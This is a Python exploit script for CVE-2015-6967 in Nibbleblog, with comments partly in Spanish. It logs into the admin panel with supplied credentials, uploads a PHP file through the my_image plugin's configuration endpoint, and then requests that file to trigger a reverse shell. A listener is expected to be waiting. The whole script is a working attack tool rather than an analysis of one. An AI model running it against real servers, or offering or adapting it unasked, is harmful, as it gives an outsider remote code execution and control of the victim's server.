#!/usr/bin/python3

# Requirements:
# - ¡¡¡You need to have the php file in the same path as the script!!!
# - ¡¡¡You have to be listening on a port!!!

import sys
import signal
import requests
import argparse
import glob

def def_handler(sig,frame):
    print("\n[!] Saliendo...")
    sys.exit(1)

#CTRL+C
signal.signal(signal.SIGINT,def_handler)

#Global variables
session=requests.Session()

# functions

def authentication(main_url,user,passwd):

    #Obtaining the session cookie
    r=session.get(main_url)
    
    #URL
    url=main_url+"/admin.php"

    #Post data
    post_data={'username':user,'password':passwd}
    
    #Headers
    req_headers={'User-Agent':'Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0'}
    r2=session.post(url,data=post_data,headers=req_headers)

def exploit(main_url):
    
    #Post Data
    post_data={"plugin":"my_image", "title":"My image", "position":4, "caption":"asd", "image_resize":1, "image_width":230, "image_height":200, "image_option":"auto"}
    
    #I get the name of the file to upload
    filename=glob.glob('*php')
    pwn_file= {'file1':open(filename[0],'rb')}
    
    #Headers
    req_headers={'User-Agent':'Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0'}
    
    #Request with the file to upload
    r=session.post(main_url+"/admin.php?controller=plugins&action=config&plugin=my_image",headers=req_headers,data=post_data,files=pwn_file)
    
    #Executing the reverse_shell
    r1=session.get(main_url+"/content/private/plugins/my_image/file1.php")

# main
if __name__=="__main__":
    
    # collecting script parameters
    parser=argparse.ArgumentParser(usage='%(prog)s <base_url> <user> <password>', description='Tool for gaining access to a Nibbleblog server with an unprivileged user')
    parser.add_argument('url',help='Base URL where Nibbleblog is located')
    parser.add_argument('user',help='User for admin authentication')
    parser.add_argument('passwd',help='Admin password')
    arguments=parser.parse_args()
    
    #authentication in admin panel
    authentication(arguments.url,arguments.user,arguments.passwd)
    
    #exploiting CVE-2015-6967
    exploit(arguments.url)

